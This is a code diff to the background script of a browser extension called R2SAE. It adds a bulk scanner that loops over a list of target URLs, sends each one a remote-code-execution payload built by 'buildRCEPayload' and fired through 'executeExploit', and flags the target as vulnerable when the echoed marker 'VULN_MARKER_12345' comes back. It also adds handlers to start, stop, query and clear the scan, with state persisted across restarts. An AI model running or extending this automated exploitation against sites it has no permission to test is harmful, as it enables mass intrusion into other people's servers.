@@ -6,6 +6,92 @@
 const BOUNDARY = '----WebKitFormBoundaryx8jO2oVc6SWP3Sad';
 let lastCapturedOutput = null;
 
+// Bulk scan state (persisted)
+let bulkScanState = {
+    isRunning: false,
+    targets: [],           // All URLs to scan
+    results: [],           // Completed scan results
+    currentIndex: 0,       // Current scan position
+    site: null,            // Site hostname this scan is for
+    startTime: null
+};
+
+// Load bulk scan state from storage on startup
+async function loadBulkScanState() {
+    try {
+        const data = await browser.storage.local.get('bulkScanState');
+        if (data.bulkScanState) {
+            bulkScanState = data.bulkScanState;
+            // Resume if it was running
+            if (bulkScanState.isRunning && bulkScanState.currentIndex < bulkScanState.targets.length) {
+                console.log('Resuming bulk scan from index', bulkScanState.currentIndex);
+                runBulkScan();
+            }
+        }
+    } catch (e) {
+        console.error('Failed to load bulk scan state:', e);
+    }
+}
+
+// Save bulk scan state to storage
+async function saveBulkScanState() {
+    try {
+        await browser.storage.local.set({ bulkScanState });
+    } catch (e) {
+        console.error('Failed to save bulk scan state:', e);
+    }
+}
+
+// Run bulk scan in background
+async function runBulkScan() {
+    while (bulkScanState.isRunning && bulkScanState.currentIndex < bulkScanState.targets.length) {
+        const url = bulkScanState.targets[bulkScanState.currentIndex];
+
+        try {
+            const resolvedUrl = await resolveUrl(url);
+            const command = 'echo VULN_MARKER_12345';
+            const payload = buildRCEPayload(command);
+            const result = await executeExploit(resolvedUrl, payload, 10);
+
+            const vulnerable = result.output && result.output.includes('VULN_MARKER_12345');
+            const serverDown = result.serverDown || false;
+
+            bulkScanState.results.push({
+                url,
+                resolvedUrl,
+                vulnerable,
+                serverDown,
+                index: bulkScanState.currentIndex,
+                timestamp: Date.now()
+            });
+
+            bulkScanState.currentIndex++;
+            await saveBulkScanState();
+
+            // Small delay between scans
+            await new Promise(resolve => setTimeout(resolve, 300));
+
+        } catch (e) {
+            bulkScanState.results.push({
+                url,
+                vulnerable: false,
+                serverDown: false,
+                error: e.message,
+                index: bulkScanState.currentIndex,
+                timestamp: Date.now()
+            });
+            bulkScanState.currentIndex++;
+            await saveBulkScanState();
+        }
+    }
+
+    // Scan complete
+    if (bulkScanState.currentIndex >= bulkScanState.targets.length) {
+        bulkScanState.isRunning = false;
+        await saveBulkScanState();
+    }
+}
+
 // Modify request headers
 browser.webRequest.onBeforeSendHeaders.addListener(
     (details) => {
@@ -214,7 +300,66 @@ browser.runtime.onMessage.addListener((message, sender, sendResponse) => {
         return true;
     }
 
+    // Start bulk scan
+    if (message.type === 'startBulkScan') {
+        bulkScanState = {
+            isRunning: true,
+            targets: message.targets,
+            results: [],
+            currentIndex: 0,
+            site: message.site,
+            startTime: Date.now()
+        };
+        saveBulkScanState().then(() => {
+            runBulkScan();
+            sendResponse({ success: true, message: 'Bulk scan started' });
+        });
+        return true;
+    }
+
+    // Get bulk scan status
+    if (message.type === 'getBulkScanStatus') {
+        sendResponse({
+            isRunning: bulkScanState.isRunning,
+            targets: bulkScanState.targets,
+            results: bulkScanState.results,
+            currentIndex: bulkScanState.currentIndex,
+            site: bulkScanState.site,
+            total: bulkScanState.targets.length,
+            completed: bulkScanState.results.length
+        });
+        return true;
+    }
+
+    // Stop bulk scan
+    if (message.type === 'stopBulkScan') {
+        bulkScanState.isRunning = false;
+        saveBulkScanState().then(() => {
+            sendResponse({ success: true, message: 'Bulk scan stopped' });
+        });
+        return true;
+    }
+
+    // Clear bulk scan results
+    if (message.type === 'clearBulkScan') {
+        bulkScanState = {
+            isRunning: false,
+            targets: [],
+            results: [],
+            currentIndex: 0,
+            site: null,
+            startTime: null
+        };
+        saveBulkScanState().then(() => {
+            sendResponse({ success: true, message: 'Bulk scan cleared' });
+        });
+        return true;
+    }
+
     return false;
 });
 
-console.log('R2SAE Background v9 - Base64 encoding for reliable output');
+// Load state on startup
+loadBulkScanState();
+
+console.log('R2SAE Background v10 - Background bulk scan support');
